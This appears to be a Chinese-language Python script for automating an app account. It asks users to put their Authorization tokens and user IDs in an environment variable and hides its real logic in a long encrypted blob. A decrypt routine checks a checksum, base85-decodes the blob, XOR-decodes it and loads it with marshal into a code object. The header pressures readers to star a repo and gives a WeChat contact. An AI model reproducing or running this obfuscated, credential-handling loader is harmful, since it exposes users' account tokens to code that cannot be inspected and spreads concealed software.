
# 大大鸣 github 版   https://github.com/985Ming/qlk 点颗小星星检测版，不点到不了账的后果自负
# 有问题请及时联系大大鸣 v:xolag29638099  （有其他想要的脚本也可以联系，尽量试着写一写）
# 环境变量 dadaming_lanseck  抓取 Authorization 的值和userID
# 多账号 使用#   例如：账号1Authorization&userID1#账号2Authorization&userID2
#入口
# ❗❗重要通知 ❗❗
#不点到不了账的后果自负
#不点到不了账的后果自负
#   --------------------------------祈求区--------------------------------
#                     _ooOoo_
#                    o8888888o
#                    88" . "88
#                    (| -_- |)
#                     O\ = /O
#                 ____/`---'\____
#               .   ' \\| |// `.
#                / \\||| : |||// \
#              / _||||| -:- |||||- \
#                | | \\\ - /// | |
#              | \_| ''\---/'' | |
#               \ .-\__ `-` ___/-. /
#            ___`. .' /--.--\ `. . __
#         ."" '< `.___\_<|>_/___.' >'"".
#        | | : `- \`.;`\ _ /`;.`/ - ` : | |
#          \ \ `-. \_ __\ /__ _/ .-` / /
#  ======`-.____`-.___\_____/___.-`____.-'======
#                     `=---='
#
#  .............................................
#           佛祖保佑             永无BUG
#           佛祖镇楼             BUG辟邪
#   --------------------------------代码区--------------------------------

# -*- coding: utf-8 -*-
import base64
import marshal
import hashlib
import random
import os
import sys

def decrypt(encoded, key):
    try:

        checksum = hashlib.sha256(encoded.encode()).hexdigest()[:16]
        if checksum != "839f21e3093d3a3b":
            print("Checksum verification failed")
            return None
        encrypted = base64.b85decode(encoded)
        key_bytes = key.encode()
        decrypted = bytes(b ^ key_bytes[idx % len(key_bytes)] for idx, b in enumerate(encrypted))
        code_obj = marshal.loads(decrypted)
        return code_obj
    except Exception as e:
        print("Decryption error:", str(e))
        return None
encrypted_code = ")o)mCZD~exN^WFUM`}WAV|i_9aGfD^GG*^-9cu?mT5kew327p7CT~7hBWxyW4|_Lj6mBDRUS=X`9cczmQfxhI32h^HENB2z!)O?72Y=~lDrrS@S8aM~9Bjo(HgEH8ZD~exN^WFU;cY@|$armOaBfF*GG%#c9cnO2A84^|ZD~e5kZJ%oGYyz%2pkl%b{rxAM;8_eduwA#Hg8yNZD~exOm1XWL~KH9kOggNaOp+kG8uWwd23@zHg8yNZD~exN^WFUM{GiCW8ZCQaK%S-GG%ybd23_9G#guPZD~exN^WFUN8~^aVjXPlcp5@<GG%ybd23@zHWOILY-vW=OKxOVM{GiCV?AxpaBfH6GG%ybd23@zHpy9TZNf)$N^WFUM{GhkV^D7=6K_X!GG%ybd23@zHfUIGZCXZiN}VuPM{L(>D0ysY=WaW6Z$~6(d21d^OKl`<<Z3!{K5t}JM{GiCV|i_9`EB8KGG)_id23@zHg8yN7jH&$Q*LBdM{GiCV|f>4aBdNFrDS<(^+*RwWp8nBBS1%~Ndf^lZfKZkO-Z+C8MH<f=xh@Y05kzJLJBJ#X=z4tYEDGfy<~nE7YhUj7f`)@4gwtn91{~b2o**a0vj0@FAWwiHyCVJ4;Bsx936RD4gwtn91{~b2x(YuZ5n!WN^YFKM}$J_W2t>6pneF&M%4+@So?C?Z}%z7Udcbwbjn(XSY4KWQK)=dpneFXA}XkQHoJ2L=6@HyeI~VYN^WF-M7Bf@4H^Os6|_PYOA#FzqhbamLjpY<3>_m{NgQWZM{F=}V|i^Gd~Qc{L1uVrc}qhIL}FNOZL>`aB^*04A`dVU6Ad4FaBfF%GG%xfKx<=4&hJ>ZeR|P(*ktuu(_q3PzH)uJU?G=eeYI#Mse3H<Pp3@R64g1QS|PPY2)I%tvT`E5dm)!_eHV9Xd20YlHg8yNZD~exN^WFQM{Gi9V|i_wJa0#IrDYsz1ZxLKOKv=E5Nk4WN^WFUM{GiCV|fQ?aBfF*GG%yb1#81dHg8yNZD~exN^WFUM{GiCV|i_9)^101nPqrtd23@zHgEoKZE5XtN^WFUM{GiC!+LFLaBfF*GG%ybd23@zHg8yNZE4_hN^Z|qM{GiCV|i_96mBDMw`XB$d23@zHg8yN5o;}QN^WFUHDfknV|i_9aBfF*GG!cZ-)dt@oo-leZD~exN^a&?GiO3;V|i_9aBfF*SYvo<d23@zHg6<u%V<V(;csMCM{GiCV|fs21Yt*XGG%ybd23@zN^B%=%WFn+;cR49M{GiCV|fs51b;_#GG%ybd23@zTxM8qZD~exN^TfZ;cY@|$armOaBfF*GGzsC4Sr)vHg8yNZD~exAZ27$M{GiCV|fv5)^A62nPhlsd23@zHg5}VL~jTZ4M1d81`7pV05t~z1R7)l3{Ni(HZ&480Rk^OEl6@s6j2{*E+TO<NI3&RBT)$mLjf=<ToN?^7cU456cPYUbRIqiB}FP56HY`Z6ej^IM?)P~GD9ySX<u(&Ehl<CIztF(1`-o9MKcE)SYACx017=QKR^^>WKnxN0X8HdE>cbbFG>g|4>=-1T>}(5UIRKF0xw5yc|R=*0S<5-4=WCRG6w}x0vaPK6($5;coR(#9W*^0cLyILH5(^ZD@_*>ehm&+SQlJhJS{0T6FdYOT0swEd=o!7ITaI43r|!SF(W%)MpIH<2M8=x6DUAiPgY7AaY{EwQUVwS6FCoW5e^awTLV5_5f3UmT3jtEOG*nIPcSMLTSOi~6h$c!A3kU~R}VQlSx^*DaWOjtJPa^wO#}`J2rCT&6j?fBE(CQyTOSMy8VDvl78y4TQ3)v(WeIIdJrEBzU<e8V2^DBrTRbW=Jv}^JT0BDo2?{kNVImMFH4tMJ3m6V3A02uFAt5h26crRJ3pPFoCMs7ASVS`{Q5SJEc`!k05JzSh6Iv=51UxkrPzE+L2Lm$*Q$lDu4l^@721+Y#AS4AD7Y8N>J4AaF7c3H5NhdBIRVyqO5KwqOIUgkiEH5ovEj14X9R(v1Ojrv5OCMbb6I3h;L@x>sHVYkKVmlBdR53UaMFTHD3?Dr;1rQ|^LqBjSQ9>pxU=<%TJ_Q$BMm1OoKpS#dQ43QPR6#j+1Qr)MI8`=JVqae~Ef0MY6I=^I3rlttbreVqPCH9_Y)5_)Uq1*520ASudje-bC>1$b09z{qM_mw4ObaeE4@_t)MNkwVEL~DQbR830H6J4kHBu8m00}4qPaZ`98!jUtNINDxY#1<N5e#Ha69EoZJ4InUMFCk;3qC3<UqvcAJ3}TE1UED$cpVQxM=&@!Ku;7UVF3joCNViFcrGJLD^DH~Hc<e5HXRTzQXM)M4FnHMbWJ=KKng$%bQ%*%7h5C)axW1XcUyH=F)0iJA5#zvaXMZU3laeYd@(Tz6;Kc$VniGkA6Nz!5f~R;Pd9l>SOzFA3Og17LJ<fK85{*LaVi&ZD_wC=TTeeqMn@$<0$2iBPhKr=MhtxiQ88{(09zsudIAd<A~RlJPd;x0c}zzwMMew|4qq%yB_R|G8U;dSdINqvHxM9F3N{!PegrH80tPf}O-d^o3I-?{6ERd6KM-^-5++m=BUpA{4iPm+EFUc=Lm~kpD?bN1KP5dM2vrIm5&~9TA{{d(WDrq7T^L$BLKS^102vJ}0xwe=5-%z>7cCY+PdFr5Kr<p65Dr}eZcHOsCM{zsC0{%zZ!dga4G}97IS?2E7zI8oK2{?qWgK%)TR#9k9~fIFdk<+X8!HhMDFS;4WDyll2VXX8d0rO>DJv~AKPv%peljvhHY@@xR3&5$c?wHC6<sqFUtbG10w^O-eJDX@druA;A{Aa0KR7QzM>kwfAr@O9c_3yY9wRRvVjm_3Yy=uB9t2rc1PLfEMNuXXR8=WGa0g}~8&Gu>GEXouBm`zF3`truKsRO^NgON%2r@`)Q5iEj8UqPTFiKByD;Q%V7Zp?$10*I602>Z9AU!|?c?t$mRYEgbd>2VHd?o-{Ib2;03sx&70#ZXiNHR_bX;v9XMGh=CGEWaNW)TBa0S*Z`E>mG2MJgX4D<4uMP!DnnHCHqb08=q*bx;o-5D70q0x2*!Wl>5ON*`1>L<Mgs055$OJy$>?1RZou4=yh^6fPzk6D~$qKP6Ku3m!g88V4^%3tcE0J}YMn4<|BTKp-Xn4+&W`6em|YXIec?GzcdJ6BrydCq@zzJU%)+JrrV0W<*{G3pg=*10E_x2MInKbPNSJG6`ogRvt?pOFsY{T^&0lD;XbmS_dl-CKUugX-5(UdM<q&AQ==OLKb&JM-fa6C^--U2o(YY7F#9`86-3!AwL%xCoT&G888PDW*i(=CIty{03$FrJxyR78z2p9aY!#BF#{<W3OjoTa9sgdDh4PaTU``fHw`WyIypK369#HHSTtQtHWYeYY6wFDKmaKwc@I5ROcx|Wd^{c&d|MJ(G)PA!6)qr5Ss^bg8X-Ux0W~BrQY<DcaYj=lKTQ=fDP1HI7$po%4qFfxC{_$9dLSx92O<I~BvKD)cr9uK6)*roB|kGkPc=;^IwTli5Ecw5JS7!EB{xhK8C-G>1sD?^09j!ZXi^FcT0k!-1`1{;9xV<|6bm~iC{GOy9WgZ>78ZCHSq~diHwhYaLOvrLJ}z|_Hw_*wHUcIEE+`~g6B#Q%axOkQ8Ujmw3LPXo3|9aNdJ9`EI#q97MF%(nJ{ct^Ya<sK7$;kGVhRXL3^)y0IUFWDIvgc3F&ark6$K9>L;_nh7zH;50zCjIQCKZZ8#qS@I$3-NE(IqAF%LIfXa*7xKQ1dU6<s<E2|aHuZ#oJfCm16I7&#6;C0hwRaSL2hCn6>*X-7B!3=(!V96c#~A02ZkIzC$iHZ6Nlbr(c9NF6r@aXKDKAQ2xv9xVt6epEGI5mHP<Jpc+!Sxpum0VXAEe;qX!Rv|w(Ed)$^Y9ksPELsl%I8iJbcRDg(3?L{SPb5DnSO5?c9#Kvm5K=ZO14tqoO(7o-Qw1_u8Y4D$U{(?&D+F)=ITRpsbuR}9SVvMG6ia?Ga#s*oTo7I}2|g|+3qyZH4@U=P2rCgJKolPc14;ln4k$w<IbTwG6FN05D=Y&VBuy700!e9KHc%G;F$-=w1V1|^IwvK41sOaV0}nC@Avgj(Vmkl|CKN;g6kc^r8zmN34h~!|a3&c`C^iEScOguD1~oKFEGJqSJr)Hs3Mv{k8x~p$Y&aPjBO@SAaR(469#b(oMotL{7+x(bd;%X)Q6T^ucPlU=8w?gke@GTO4N7@KH5EBoKNbi!PasN8I#w|ddLADfC_x1aegG8$COUruHa;I!Nk$PJ8Bj_;9#%aScT*P`D;XXlDIz6i8Bh%eI}=z~6CEN2eFjG@8xlxs92G1B1U+>M3l>KX4jmOJDmMf`GCd_A6j~V`03{?dM*=rS13?cw6HypCKNuJh7YqkX7Ykz(3N2Y12|oxL0uC()L?Z(+1XCnD2Nh>hT}%!rH#jp@UIaJ=991?g0t09k6aX(x2mxOc1sEY+Hbyr$KTQ!JY7tCcDNiCi3t9{y6)hk!1}7O2Fa#+mBnTl?PXTZpU0W^%P*M;p9#I|=CO<YoX(AvwZ$u_PT~1m;LnI(edjVBg1XoE0dMOJyNk9xt4_G8=1uAtAS`!5(6A5M{1OYue6;m}aX$&bj2_kJ6DN0o<AqfBlT{coZ8#X0DPEcG4Awn^IQ%N2N6$>{p1Pc`#YFr2bE=&+tS`#rgTRkuwAwCBrS~)sJB@TE74K6lg7Fs+SJX{YYGARrJcvKNo5Eu?WSXvzzP#*&v5Ct+Oc|jyf8#-SqIt&0ETTcR9F&$WbVhel;2}}$z9w1!|cS;i`4-yIr7$6u>0#rLCAzfZ>X*y_E5fgO>2o_fmZ$4uPRYEyePBbtx7YrT=EiqgzQ7JSWRZ=cRXB$2<ZZi-8SVk8G6%2nTeFOj}Pc#lDL_RS?M+aah8%JFi5dmi_P+UhCKnNu=W(Y+nQ(6f#L>@2=H8XP@Jp>G8KOr3e4<7?W0R((IP8LO8IUG)LX$vqAQBpQgA{|L53Qa5@4MrFX9Rwsd8!$u^Apu`~SzR;&GEgckYza?ldI&F84JJeaK>>CO4=xxo04gafA6XU&GE#a53q2<WCjt{4Jue6qHZ2%PZ59m+1Y1TE7btrj6kY={22l<II!HWO0Z>*9Pg`SIUq2mBKUokqSz2;hG!GG2bs!mFAUy$J82~2}Q!E4&cpU;1MOq0Cd=qd|T~aDeaV<$M21)`@2`>o_R2Bymas)RdT_PJOUMpu8Edd`TZZr;lZaOyy4jEG~Fac&s7)Cu$NiG-!Ksy#ZQBoKVXIohUEDUE`0zXnF93~_xT|X2SM^!33b1fD<GFKQR2P;K$E(r$@HZdkFMi@Rr3{z7kO&TgLQ3VfLD-&}#d>#Qc2P*<TPB&IKHA6Nq3?4KgK?ElXaTk3zB26g*VGK?fHWV`?4HI5K77TkjU^NLE8#^QiS1k+<6$%4A5CH)Ua4G;3D>eW;CrWZSbt)nsF#;$n13d`{9TIRoDLGmR1v_Rs8Uzd_NCg5XN-J9qCO8c!Mj|{#A`1`*YgiXEK3fhiUr9+?3|w(n8(uL}7ZV~oZwU<}MNA++CpTOj7aT1=6h<js8(1X(WEe>#CRkj1dss3)Sq2_D8yXiZcR6c3TQ?CaM;I4DcrZB>G(8G-W*s*=T08|RKSvKJ3n^g}F&9%lAQ&J;Yg9;E7X<)3SR8pMP7Qt!BLq+qJ0Lp=7zIv1A_f>uNeVa@Ku8oiO8_}5G&T+ve@9;}a5Wq(RTe-nK3WM3MJzZWCR<4=OBxjvSs*1QBR5BHWGplw6G=4}76TtYe-s{GTqOq`Kof8RG$R}#IU6G_b5k8GHa8a-HY5o;2OCZUQeQ_e4<H;10RuiQD+MkYc~mS}AQ?RzF-RXOQZFVnCNvm*bOn7O91{cyIZ+-4W*Y(tSOFjjKMfcIRap-bOG6P8Z#8B*RaO=R22wyiIaP8aRSF1EPX~EfaWOkw7$6pDa6)TXIwNNw4h>i}GXMoaKsqTbBnxsoaXb@MGY1D4Up596As8SbdqyP*b{udERVY(cL@fg(K@nRBFD+jQZVDSI5m^O2IUPwfEIA<r0~uC2SRO1GSs5A*G8-r>9swmW2v{j4CRsEl23-a?G7mW)Ry;Oe1x^J+OIZgGNFWwO6(<-JX*VcvG)+1n4^T)AI5~MOOe#%DP8=j9MFVVBJ68!c3nxxGBm^53F*02aI!ii2RtOaiG7l_aeJ(6MI~NcQE;m$eB_l0ASQAcEGbdv}VNfzPA5LF8T190gK3WYF4IwfbY%UQdTL~c-0tpg2Wm!uOK@JBvTQC=2SS1ZoKOjDQ9anY-S_d3mK2UlANHaV#Mjcu-VGT3}5GN`JE(s?PB^Nt2IWrzY9s)f%MNUOm3m*?_1R--56A^3)GbKDf5Hvd<Jw;Vo2T?Nx8e9_{SSt!GK^8htQY<r0GzdK|044<rBN<5~H5_CiR0azm0Ub#yPcLgkPCzV3F+>PvaT*N`B}*v+Ckt*DNeCMZR01gzV;mYNFHHbKCLT})1ywj43_?5<Isr5T6jv8LCR0f+4MaLx9}Fud5DPLm2viae5IbE$GA%bgQdTWrTvZSwU{fAg0$3;+J`xT;Y6)uqH(DPn6)z<$WmykbIZ#$22LTQw09R*5DHR+z7Cn9y6HXr;2QMN&W+6d1GBi6cW;F={IwuVkcR3XjEer`BI!RV8HVg?w120J_2v{z0U<+<BA}|3CZa-fXG(-+LT|y>3FC_>oel0i>2rmmOQan2bB`ZHtZY3ZlcMA<!1uQR7PEapJUMM*bKOH$eM_)Q66$>W^CL<6Mc35*zB1Tmw6J7*YKo~w!I2$=Ec@7CD6e@T)1UX$D7f}icNkS0=RVjM`d>t!T3qU4(W-5LvS}Pbr1~*QAC>n50A`2HmJqQX#S_d0kNGc#N9V{#XG!=3oc^*#^A4VYr5(h+75f@`6R#iY82_G~o4F_^9J_K=45*{pa3?pwSNDD?UI0O+vW<f0&F9%n5aYP1PC^kMP3Lr6ZFf9om5*0T;MIt;V3OZ6<6(B$p4niqe01+oaeHcvwdOI-zP8cpR7ElU6bW}$&1W*(nV;wpPG7CFDH!CJI1}7*SA{`Ve0T*Tx1X)TuS}8hv1_WUuT0t`sdKFhVAy_#J1vN4gF(NBKWL+XDS|&C;e-9EaH#u+!8v`aZ1sfCw6B#2S6-I4Uegj7l6%H9Pb_oD513MQq21h7zaz!c}R3QmCT1I&@a2OH-DIOkg9|U<mCRlVh9X<p(E=36`ITZ;Q0s<=qQ#&mwE-L^FaVK+AA{;vlJR(wc6c%t08B`k%1t)tRawtR^GA$}UL@*3IQwt(ID<TGSZX60J761%SKrv%FWKAkr0uD1i2wZ3?140lsa#bxJdM^P=3K|R^A_rz!L?u%fTo*_fK{y-_AOUt-B~=p-2`@5LH%VSX9b9k>7ARF)6&nd_N*iqmNdX`#DN`zUc}OV>RVxKM96x3NYZzGzJ4z;Lcv~tc0z+k1b_@|dZ9i~ECL=Nf3m_s1Q$aK+1Q-AgL`E|_M=u{IF)9%bc}XTMNGd-RQ#}YQ7!?*7FcwE12Q?H$HApT}XCf0XJX#bO6g>w7Kp1TfSyE6t4;~3;e+?W491JxWDmDoxAP^c;Kqy8bIZ6{4NL)x*D=IvCa|m@;A58^T3Q#iuZ%QBmJU$>_OA`c83<n)tL=Z?ZO<89*P)vGTFE2M>Fd+pE8c_mY7+4Vs5eGI=H3c6B1y&3=EJ_PT0!vjWFBKwIMJ*9Z8c;n9A1FFK4kjB81TH=}7!)W)YZ3}!A{=B&NkR`5JqQ6=W?oYf9~&bcQW-T+UoK-SX<h;|2s8jyJWyRJA}Av_A5a5PCn*_XVKy8lNDFZTA~_yAEi^V*1PC54FBuS3A0Q_vNfQJH9!?@!H7Gs{d{IX)c{vm+4lh|&Iwt}S11v@_5<w~^UN1g5H3k$J1YcJ_79u4KTr)WvGZSGnPcT~@6dM<L0a-09BRn7^GARmfY8wzTI#U@z9a&-wU04+iItd;*dJhW~8Uq*=dl@|i6%uz^8YneeM*(ve7B5Xw1uGK`3tl2O6)<2L0#87Eb|M2ZM;|)?3KSUt0uv1+FcVl52Pb?+C=Lx9J~sv<B~xP}S|>eST_9~Zcs4}=C>u*_bSVK|4KOehECVhh2P+&AR1Fj-6*m(F7a}J?EG||ybpbXj2TCqJ08;`Z5(Y6s2QelGOGp_YQ4$gy6bKXnP!tCRC;$`^C|UqMa6A?cS{ep19xyUOdNvCiO$QTke*kC?B_0V)3qJv5CQku6QWrP?Ha{^LNDVw!OkOkubV4i|BP=!xAsGugaU3&QSTaQ}E>$iOdqfUB0zVKrX;2+iRx>M7Vj>(UGF)gP8XsFZ9bRokTOKMW10POl1tc^rRZ<2JI#oR%JPiOEQ5`N-4K{cpV_8Hl3LPyY15PbAIYTA`1uzT;6d-0(76lv<4oG|=NGv@-IvpSha6};kE;e#O4mKSo3<ne!CM^XIJR5%x7*bA5Qc_C=ZVCb$2|6SLC^tnVdnpYYUl~{(R2FYg5ey((IRREbXBG%HH4$<$1S>KKJPi;#07M-u5+W>7M+#FT1Rq8S6EzAPSS?^sdm90NFAfw}R2K^o1|1(dODQccH!TTxVjv(0JzW9^HbXive-M0BKp!3=Q42Q@TqqSRNK{5Ucpw2ZDFPudD+&}kE;Kk>J2(+pJ^~~sW)BNpCP+YXT|H(S5JV~_016pBa}+lf0s;jKFeL^=30)OK4?Phu4Hh{WRud@_Zy-!AJsCA$Hby--0Z(yELNE#e4PIO_5J?gYQWz2o5I-;*7%w><02V0$C<_EFN)j{|3>YLSdKqL<5CS0rc|<QQ9!7FCD;_LE1v&^K3Qi6O8yPhW4J`~@3>ydm08$7&02(<;MIQ<dJ30_MS3^=5DpUYtP$P9eS{@S!0vk18EGu^;IypBS4h;_+T{a*!DqmYWXj(lC7FBRXcLG{DFbD`$TNfQGRs}3WbTeB%11CImLs2mzFHdX{4lyNv3kMY?6;NJ4Pb3BdPF)gR5C~pr4qgrh9Sa0BD_18Ua{@aI14>Xa8&`fzM>Pml06#YfWnOa(Hw$t+E*=+d837tVG*MPAFD4)vWETP}K3+X@awi=oKNM^{098(76Fe+ED>nlOI7B8TT}Bu!I{-^0Zbbkz84x=uE=MaNG7EZ62t6PNJql_h7%U1R3mFqH3leH34LTeeb2c;v0bF+~EKpDkObaJLY$X9ZK~4*OS5tdUH(5ObFf=|r4p{(NMOsT3R$U4vTQN=|Iy46|KqMwO4ht19B2Wtg6(a^JOBN~tIZ<j687~SjDlQ#+KteSyB~flM4o_Wv5CAMn8#y-{IA0(FN+lpbOIk|;P8DY~5mk3j3@IKr3py=0OH3sWL|rZjUmXts4lYXvel2wsP7`fddo%)R3IS$N1Yb^CTOK(FLswY?79}rravv>MFH!+OVLl)sE=34e844%`H7Xx6c{d$3DgiS*PcR55Tp(~ze;6|ncoro?0UTdQA}uUHR9H|D9ZDcGR9rX=2wY+YVM99;AP#&C8y6J^I}8pZXIM&6Pa+dzeIyB9D>g6(VJb-!KTR4m2p9qxMpy|re;H2&5ezp52@z~d6i{O|b5~drBPa-47)mM&TMs&36Fdb@5er2rU>tP^5eX;}b}S4%9TpB1H3}S9BL{U-12PymNKGgMUMU_>D-M1G7#&jy4=8F24*?J_5*z_tURypSR3HO)1zivxKr0?kAu%-$F9HD=F<eF*Hykztb~h(JGaEcPLku|tST+J6Jsbxue+fPySW7t>AO<rD1OqD?7!3q(MFABpK36UXVF)2EdN?{wD^FWJH8Bk>ML+@wR2y77Y%qRM9WN<Ye;XA!A{{&iKrS0FO9CxIWe*r74M-JfTOxZZQv@$X5-bpMb07;C15aK#2{3mu6IcWWDlZr$2_QTxOHBY*VJ<IzE+Qg8S5p=%Fbpd-RWm^aE&w@UUI;lPL@F);Eip3zD_I>GQ8XV}Nl*b&R1-Th8Aux;3K$m+DJ3RPaXKsv5gj5%FE%AG2R|?YKnw^k0YDBvUK12QStkJ`CnhdpV@Np@E<rC797ZBZL>(?s8WUb`3mE|q3Rx5(1T9+$ECV(zEi3|5FG~m+d{8btQ7J4mT22`r0$Ff7J5gGDE<_s`1PCt^Rsty;ei;=fCR0^%cNPpoM_nH>HbhetWC#)`HvkC(8aH(xT^AZK1UL*bXij`yKS~BOU{fI+IYehX0zDZ}F+~|ONGC8N3|kX&O#lobH7h?sI}I)^G*bdx0$K_J3{?mqLOLHTCQch^2qq>&ISUg|0#_L%ehXm)AS*;tIR-07a3@?F7cUGkeGP3>L|7b3Aw*6Rb{{bW5>gF8RYVOTbRjiI7gZ~1Oj;Ne6fAE&0yZQW5>OBc00=-DO*}azdjSeF9{@`@5I<>NQyO?1KOj42aStyvHb6T$R!eSIeGxboK}tpd4M{&I17BxVXEq}PH79vKEfYsKMhOiUMGqWF8&Fk!bSwZ38czW_bRShJc^D2^9v)N^Q~@Ctav3}qEe|w*7fvio1r!wo4+=s*a5WM#3sGDzJs=?#P8$wf4>1%1Q6K;&Q&c-70VD?+2vq=FUQIL%AYC;wZ2~eJ3JxO$Mh$*29y5A82~b65Dmr^7N=jQzI#zfMY6Uo0LLC!g1w3a*16vP01wBp?D;EbL01huU0WcOJRT2~n99cFc1Q8f62p0}j1yw?Q7+QK%LM<FGI5#6RQW;V$8wCSzX%=%HC<-<NJp(QkFA{JS7%Ln&Djg3nVIwCn8w*Y>c?t<8S}Yb0dlN-G5d#Q215X<WU0FO&bwME}I!0CrLnL!XKLvDFD+Ls3cQX(WUrHEJCmjYN8UiyHBN<$HXjf`B4;2ARCRH9Cc1a2{EJ`OhBwa8FMGOE3Odn1gS4IE>4ITv+dI?7?9t8j;T1N|2Ib3%FXbV{m96~i9K^S9FATbs*X;xis7foRgRVzGO2QNMqco!}cDHSUmdr1!gFIP7sCj%E~cwZ<%TMk(POdcc|bv8&+H6RsfcuXNaJ04|5COQBx0UinsH#0sz3n4F3Kr34lFdaMw2RJ1s2`M)}7%4n`WCkHL87Lws3l2UiA6F;^02VGCP8~8CRy`yK111E11~d%~8AKgdS~hS|cr`Kv6jBC%MOJ=KRSq#ZE>}kxD=0NP4LL40NDK;IYg<)8Oej$eN?&pZC|WTJU=>eg5E23dArVmtR8w&|Y&0k>2wep}3L-B9Q5858at#z~Yz_<s0}Eb6A0{j@3Qq<dK`l2RVH^%VC?`D%eg;x%bptpn1WPFu8Bz%b3PThFMJF~Zdqfx{ED<$8ZVXTvc0CjtG)f^SFBW?)4kZs!Kwm%rT00RU93C$vU`q!P0t^W+4njH;78P^`O9BW0NGV4iSx_GvSsVZ{8VgS?JR5LdD?AY*SwjRmS`7msG*wC)O&e@b7&~WI97PB*5hXY^Nk0?{H&Ylu5i$cGJv<OR5MOOBDp3j&6E`IvA5SbS4;4gAM*}M}YcLZg0bWOPU|kbk3qw6E7zRNwGdyn`FjE&VHAD^$6j?bbKO$3a9b7at7A158Ee{0%8C5tu3==;FLIi4Dc~3Yi0}vqz2LO2%RS7RaGa^!aZVDm*Jy=o?JP09GPE0u%ML07yKuI|{AQ?U$1Px3E1O{gtC@V)_G+GuCc0(5@JykUcKssyzJ`M&4bObUbb315K5ivJAFfMUNTNMslI#@a?U=b)38xbW14i*v_Z(0Ua7)~Tl0|5^;dLu*!5gQgEK`aJ25DGmlDm+nO6hC_r1T!=s5+@-xUK}r7I5<}Y4p0yj5KS{b3l3i@5ibl616^EMClF*KSvNlxHzEsRX*diCP$e)G9WW&$4gfM%HZch+H&s3|dJZfD8A?R}22^}c5E4F6C{ZzR6h8w)JR4M584oud1zjIJP8|etZxs?D4-5|#4hldNDi<3=T|^i|O-C$WTNF1vCp|L>2?IC;H53gkEhAksGz?=EJQ5WgLrq~GaxOg#6eukic3W*CPz65}U|IqyVI_MeSV|2mHCtvu1WgGbHw+>HMN4@KAs#JIY%5qj3KbkiG6)DS4j~=}23`^i8wD_N9xG-fP9hW$2?I_vGA0-%N){P0RVqF!T1X&AQ$racUtV!M6gzMjGd~_Zd0TcF3NSKQOe8u{4H*e03SSEedM_SL8!<FF8XFlq89O{V4q72W6$SzuQU^f?6ju#+XcZk4Qydjac2O1~Y)T>qH6Jn>G&mj;cqLL9HU&BbKwE1x3rGS60|_=6Em{!_9T-3r7Ct^MVIV<MI8Xx;b{i01CO{uMAww_`76d9y7B@UwLmw>z6jC1$4M8w<Pz_@jMgeV3X9gp6GYSz-1wdX`B{6eJQ5i%LQeOstS0@_<T@h_1eKt`m1zu<zODkF!SqO7FVn{eJTvSR4b`}#BI0|f9AP5`<12`xcC?^FzC|^A#W(pAz2@VQlTQ+hr7zS-ZGdoupdmIs31w=(3FI!?=U=9FNG8`@sXG9lEFIzSNJ`Vs8GgTZ5E;e64C^#@Z0Tx_GAs{(9RxD^BBqk9ZIY$XIe<VI!C@x+B7GEJoR0K~5G*B%cTMY+YJzO6bdk`&YJt74fRZTq`5nK`gXFowTP7D%ub{iK<B|0G-avV%5a{+rG9Zo$66)j{lRsbgo3Oo)gN>?~pQbTtS9U%&CZy_-WC@BG0FbWa^10r4?M^8y7A0ZY~3<VB911J(E2q1GcIZ+^60xLN_5iL^?6faXY2QWWb9#L%|3OXMWehn`l7#svT9w`n7Mgl)kKt5IqeqAjt00kE;9wl2X9Z3ZUTR$}n99V7|b{R+#NDme%Q7Sw|E-e#2E-_4SEgo`0B@a$98w)!LQ3OR96FXOHN<RrK5dkk+V^ae?Y)1uBAQ4+iH3$eU3Mp9|BQ7(35L7N-7!@2WKQB&TH(qd91U3dd2Ut2Fcq1P!MkZYe2p0!gE-evAc`y<dVlx38G(;9BL|z|93IYO5Cov8JO(S(34<;l_6#y#*9$au6T`(3HOh_zJ3s4PNQC(hZR3SPvG))2s0w^tHB2^|>FB@9}5ez(8dJF>?H$PTma$IB%4^S#4e-1}476vaFDp5F15jJ5_22?>HJ3uoNT^DOpH6lF@eOVtYY+Wb=G!Y$M7FPi|2UQO=KUq6*4hL~s1tu&QGCLJKIWKb?TNF-RPA(lA1~)_#1WE-ET>>{6P7-Gz4O|OyA`c}%S~xpG9Y|wUW=t+eFkW5-Xht+JQWz#91XdLsFBBvQ8wFD%6I&1~Qv^vuQw{=ea072%GF=c`XI?NQ0xNu4R5wsL9$7ghR2()XDpg8<4KWueE-Dv6K1Wdl7Y`OfRsc{KRSj=lTplew12qI|UN!<+M=f_OdnY$HG%J1;RY4~TR1G`_MJZiTI$i`bL>GJv956pE9zR=f5hnr%A3!eyGBybjdnq4FJQzp~Q$!9#M_6kODn&CbY9n(w4K-aaTSsv<1t%dWGyw}^bV+C=6&Qa8cmoG@78@WeT1`Jy6(=rHeOoXZ8#Grv4gotZP*6NLD@9xm2?qxSUIbJ=Q&MCEeN-qB2P+W<XjnNHUnVy<Y#uOsJ0&p{Jy8fH5fCFc2R1`PF90%f91n6A8eMudbSocVV>2RKS{En<2PSnJT~ZtgC^;+`2_|R)QdT`GFAr2LK1vKaBN1L8Mk^#5Ogv5{KUgd$eL4qR6fSijYg;uMEg5S@RSGpi8bdG<cnCjBEDZ>LUL`&iL<n_OX;%#*G6ywQ5+7DwJ{)mFR3;V&Mm0zrOB`!k0WTL3Cp1kl4_ho<Bmp=;JWV134hlC%JV+{iN+BCpQax@=Hcwb!ZUqA(H!e#CK`<~iY9|OgQC|)TW(h7CUPKU20|qcXJ0>Cr3qDLKB@cU7MpzOAI8R+XWD5c#03BxoFD4xsJ2(MD5=37q7CAd40}K^YCOSKPdKW502wXHVbO|>(bRrB+NHZKa7a)E^TtiF-Gh9j<11B{SSV{sFHeM=c7z=1fQx6{tIY>D}OEVBTIWj2&OFlA11s;A@2uC{=9S9*(6+9;>4kk2LSOz#W1w$)29Zo3%07P{}2NydG2wEKsR7?;7SV(UqdR#?GGFmHdZyRnsS}+I(6e2Y(HW)V_Mk7WyT`wdy0t8tN3n3~EekXn+QVkvuB|0HLa#3a+B1l_W4H+XcWKaS+Azv<h2w7w|KTIY#4H#5+a7kek5HJEBG*~DTQ#~;y4N67?MmZNSS`&F%cP%X-0TK#b6c+~wI|U*NelQF{7aRdS4lW-TEde?YD+Nw39X4_gH%JsHE><QVT`K`HKm;T*Tm};aQ!sBH6(Un<dOC9<BLF=+HzIg7OAswC8CMSoT^A);0|zV_ZVNgGK3{!JH!E6MT^)H@1T_*zH5woz3K?)v9RX`vZbL!_0TN~?Bmr139Rn*QVktB}F<Ltx5CSbw2s$zqCoT&QKM*?`FFr(G3pp%E6hkj2K{FR2Xjlg;TmvFbeIZeNG(I&l5*9QdK3M}^W(NZ-Cj~YNA73|K3J`W!BSjW_HVbkH6iWaAL=8C}RZ}5COkPWS9#JnuI9fe